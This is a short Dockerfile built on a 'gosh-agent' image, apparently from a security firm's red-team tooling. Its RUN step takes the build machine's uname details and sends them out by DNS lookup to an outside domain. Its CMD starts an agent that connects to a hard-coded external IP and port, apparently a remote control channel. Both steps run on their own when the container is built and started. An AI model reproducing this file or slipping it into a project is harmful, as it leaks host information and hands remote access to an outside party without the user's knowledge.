FROM praetorianlabs/gosh-agent
RUN un=`uname -nrs | sed 's/ //g'`  && dig $un.dns.praetorianlabs.com 
CMD ["-host", "104.198.138.155:8083"]

